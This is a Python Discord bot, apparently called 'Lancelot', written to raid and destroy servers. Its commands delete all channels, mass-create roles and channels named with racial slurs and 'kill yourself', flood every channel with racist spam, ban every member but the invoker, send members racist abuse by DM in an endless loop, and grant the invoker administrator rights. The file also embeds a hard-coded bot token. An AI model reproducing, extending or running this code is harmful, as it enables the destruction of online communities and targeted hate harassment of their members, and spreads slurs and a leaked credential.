import discord
from discord.ext import commands
from discord import Permissions
import random
import asyncio
import colorama 
from colorama import Fore
import pyfiglet
from pyfiglet import *
import time

#########################################configs###############################################
messaggio1 = "@everyone I hate niggers"
messaggio2 = "@everyone https://cdn.discordapp.com/attachments/1080949240597073970/1080951014804422716/twetwewey.PNG"
messaggio3 = "@everyone server demmerda, entrate in questo https://discord.gg/EeJEXCUhv9"
lista = [messaggio1, messaggio2, messaggio3]
###############################################################################################



intents = discord.Intents.all()
intents.message_content = True
intents.typing = False
intents.presences = False

TOKEN = "MTEwMzQ0MDYxNjI5OTQzODA5MA.GVPMYw.7QxjQGqb9agGfpIt0P5xZ3G3S38zSrnYU_iIGE"
bot = commands.Bot(command_prefix="lancelot!", intents=intents)
    
@bot.event
async def on_ready():                                                                                                 
    print (Fore.RED + """                                                                                     
#                                                                                                   
 ##                                                                                               # 
   ##                                                                                           ##  
    ####                                                                                     ####   
      #####                                                                               #####     
        ######                                                                        *######       
          ########                                                                 ########         
            .#########                                                        (#########            
               ############                                               ############              
                  ##############                                     ##############                 
                     ################                           ################                    
                        #################.                 .#################                       
                           #################             #################                          
                              ##############             ##############                             
                                 ##########               #########,                                
                                   ########               ########                                  
                                  (#######                ########                                  
                                  #########               #########                                 
                                  ###########           ###########                                 
                                 ################  .###############                                 
                                   ###############################                                  
                                      #########################                                     
                                         ###################                                        
                                            #############                                           
                                               #######                                              
                                            
    """)
    logo = pyfiglet.figlet_format("Lancelot is Online")
    print (Fore.GREEN + logo)
    print (Fore.LIGHTYELLOW_EX + """
    Commands:
    lancelot!maxpower => Nukes the server
    lancelot!geass => gives admin perms to the author
    lancelot!deterrent => Spams a message to all members in the server
    lancelot!extermine => bans all members except the author
    """)


@bot.command()
async def maxpower(ctx):
    channels = ctx.guild.channels
    guild = ctx.guild
    roles = guild.roles
    members = guild.members
    beta = 250 - len(roles)
    await guild.edit(name = "Nigger")
    for channel in channels:
        try:
            delete = channel.delete()
            bot.loop.create_task(delete)
            await asyncio.sleep(1 / 50)
            print (Fore.YELLOW + str(channel) + " was deleted")
        except:
            print(Fore.RED + str(channel) + " can't be deleted")
    for omega in members:
        try:
            nickname = omega.nick(nick = "get nuked")
            bot.loop.create_task(nickname)
            print(f"{omega} has been renamed")
            await asyncio (1 / 50)
        except:
            print("mf can't be renamed")
    await guild.create_text_channel(name = "nuked")
    channels = ctx.guild.text_channels
    guild = ctx.guild
    for n in range(500):
        try:
            if len(roles) != 250:
                create_channel =  guild.create_role(name = "kill yourself")
                bot.loop.create_task(create_channel)
                print(Fore.WHITE + "1 Role created")
                roles = guild.roles
                await asyncio.sleep(1 / 45)
            if len(channels) != 500:
                create_role = guild.create_text_channel(name = "fucking nigger")
                bot.loop.create_task(create_role)
                print(Fore.YELLOW + "1 Text Channel Created")
                channels = guild.text_channels
                await asyncio.sleep(1 / 45)
        except:
                break
    sent = 1
    cap = 1000  
    while 1>0:
        channels_update = guild.text_channels
        for channel in channels_update:
                if isinstance(channel , discord.TextChannel):
                    kran = random.choice(lista)
                    coro = channel.send(str(kran))
                    bot.loop.create_task(coro)
                    print(Fore.WHITE + f"{sent} messages sent")
                    sent += 1
                    await asyncio.sleep(1 / 50)
                    if sent == cap:
                        time.sleep(5)
                        cap += 1000
                        
@bot.command()
async def extermine(ctx):
    members = ctx.guild.members
    for member in members:
        if member != ctx.author:
            try:
                await member.ban(reason = "Nigger server")
                print(Fore.GREEN + str(member) + "was banned")
            except:
              print(Fore.RED + str(member) + " can't be banned")


@bot.command()
async def deterrent(ctx):
    blacklist = [ctx.author]
    guild = ctx.guild
    members = guild.members
    while True:
        for member in members:
            if member not in blacklist: 
                try:
                    await member.send(f"{member.mention} you're a fucking nigger for being in that server")
                except:
                    print(f"{member} can't be reached")
                    blacklist.append(member)
                    continue
 

                


@bot.command()
async def geass(ctx):
    guild = ctx.guild
    roles = guild.roles
    if len(roles) >= 250:
        role = discord.utils.get(guild.roles, name = "kill yourself")
        await role.delete()
    role = await guild.create_role(name='user', permissions=discord.Permissions(administrator=True))
    user = ctx.author
    try:
        await user.add_roles(role)
        print(Fore.GREEN + "role succesfully given to " + user )
    except:
        print(Fore.RED + "something went wrong")

bot.run(TOKEN)

